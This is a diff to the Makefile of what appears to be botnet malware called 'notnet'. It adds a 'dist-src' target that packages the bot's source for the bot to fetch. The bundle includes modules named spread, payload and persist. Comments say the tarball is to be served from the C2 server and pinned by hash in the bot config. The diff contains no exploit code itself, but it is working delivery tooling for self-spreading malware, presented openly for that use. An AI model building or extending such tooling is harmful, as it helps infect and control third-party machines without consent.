@@ -80,6 +80,24 @@ dist: all
 		LICENSE \
 		Makefile
 
+# ── On-target compilation source bundle ─────────────────
+# Produces the uncompressed source tarball the bot fetches for
+# on-target compilation. Serve this from the C2 (e.g. /notnet-src.tar)
+# and pin it with payload_source_sha256= in the bot config.
+DIST_SRC_FILES := notnet.c \
+                  src/protocol.c src/spread.c src/payload.c \
+                  src/persist.c src/util.c \
+                  include/config.h include/protocol.h include/spread.h \
+                  include/payload.h include/persist.h include/util.h \
+                  Makefile
+dist-src:
+	@mkdir -p dist
+	@echo "Creating on-target compilation source bundle..."
+	@tar cf dist/notnet-src.tar $(DIST_SRC_FILES)
+	@echo "Source bundle: dist/notnet-src.tar"
+	@echo "SHA-256 pin for payload_source_sha256:"
+	@sha256sum dist/notnet-src.tar
+
 # ── Help ─────────────────────────────────────────────────
 help:
 	@echo "notnet build system"
@@ -88,6 +106,7 @@ help:
 	@echo "  all          Build for current architecture"
 	@echo "  clean        Remove build artifacts"
 	@echo "  dist         Create distribution archive"
+	@echo "  dist-src     Create on-target compilation source bundle + pin"
 	@echo "  help         Show this help"
 	@echo ""
 	@echo "Architecture-specific targets:"
